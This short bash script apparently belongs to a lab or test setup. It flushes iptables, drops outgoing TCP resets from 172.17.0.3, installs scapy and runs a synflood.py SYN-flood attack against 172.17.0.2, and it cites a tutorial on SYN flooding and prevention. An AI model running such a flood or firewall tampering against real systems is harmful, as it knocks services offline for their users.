#! /bin/bash
export DEBIAN_FRONTEND=noninteractive
#source: https://www.opensourceforu.com/2011/10/syn-flooding-using-scapy-and-prevention-using-iptables/

iptables -F
iptables -A OUTPUT -p tcp -s 172.17.0.3 --tcp-flags RST RST -j DROP
cd /testcase/
source /testcase/attacker-env/bin/activate
pip install scapy
cd /testcase/dos/flood
python3 synflood.py 172.17.0.2
